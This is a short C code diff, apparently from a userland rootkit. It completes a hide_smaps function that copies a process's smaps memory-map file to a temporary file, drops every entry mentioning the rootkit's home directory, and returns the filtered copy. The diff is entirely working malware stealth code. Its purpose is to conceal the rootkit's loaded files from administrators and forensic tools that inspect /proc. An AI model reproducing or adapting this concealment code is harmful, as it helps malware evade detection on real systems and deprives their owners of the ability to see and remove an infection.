@@ -36,9 +36,29 @@ int hide_smaps(char *path) {
     
     if (smaps_fd == -1) return -1;
     FILE *smaps_fp = fdopen(smaps_fd, "r");
-    if (!tmp_fp) return fileno(maps_fp);
+    if (!tmp_fp) return fileno(smaps_fp);
 
+    int i = 0;
+    int ignore = 0;
     while (fgets(buf, sizeof(buf), smaps_fp) != NULL) {
-
+        if (i == 0) {
+            if (strstr(buf, rk_home) != NULL) {
+                ignore = 1;
+            }
+            else {
+                fputs(buf, tmp_fp);
+                ignore = 0;
+            }
+        }
+        else {
+            if (!ignore) {
+                fputs(buf, tmp_fp);
+            }
+        }
+        i = (i+1) % 23;
     }
+    fclose(smaps_fp);
+    fseek(tmp_fp, 0, SEEK_SET);
+    CLEAN(rk_home);
+    return fileno(tmp_fp);
 }
